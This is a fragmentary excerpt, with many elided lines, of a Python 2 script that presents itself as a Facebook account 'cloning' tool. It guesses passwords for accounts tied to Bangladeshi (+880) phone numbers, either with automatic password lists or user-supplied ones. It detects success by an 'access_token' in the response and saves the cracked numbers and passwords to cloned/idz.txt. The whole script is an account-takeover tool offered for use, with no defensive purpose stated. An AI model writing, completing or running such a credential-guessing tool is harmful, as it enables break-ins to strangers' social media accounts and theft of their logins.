...
while loop == 'true':
    ...
    if (PassWord == CorrectPassWord):
        ...
        jalan('    \x1b[1;97m+-+-+-+-+WELCOME_TO_DARK_WORLD-+-+-+-+-+')
        loop = 'false'
    else:
...
def login():
    ...
    os.system('clear')
    print logo
    print "\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \033[1;93m[1] First Follow Me On Facebook"
    print "\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \033[1;93m[0] Exit"
    pilih_login()
def pilih_login():
...
def Trypass():
    os.system('clear')
    print logo1
    print '\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \x1b[1;93m[1]\x1b[1;93m Try Automatic Passwords'
    print '\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \x1b[1;93m[2]\x1b[1;93m Try Your Own Passwords'
    print '\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \x1b[1;93m[0]\x1b[1;93m Go Back To The Previous Menu'
    pilih_Trypass()
...
def automatic():
    ...
    print 50 * '\033[1;94m_'
    try:
        c = raw_input('\n\x1b[1;93m[\x1b[1;91m[KAZI]\033[1;93m] \x1b[1;93m[◈] \x1b[1;93mChoose Area Code:\x1b[1;98m')
        k = '+880'
        idlist = '.txt'
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;95m[KAZI] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('cloned/idz.txt', 'a')
    ...
    print 50 * '\x1b[1;95m'
    print '\x1b[1;95m◈◈◈◈◈◈◈◈◈◈◈ Developed By KAZI VAU  ◈◈◈◈◈◈◈◈◈◈◈ '
    print '[⚠️] Process Has Been Completed ...'
    print '[⚠️] Total Active/In-Active : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[⚠️] Cloned Accounts Has Been Saved : cloned/idz.txt'
...
def own():
    ...
    print '\x1b[1;37;40m◈◈◈◈◈◈◈◈ To Stop The Process Press CTRl+Z ◈◈◈◈◈◈◈◈'
    xxx = str(len(id))
    jalan('\033[1;97m[✅] \x1b[1;97mNumbers: ' + xxx)
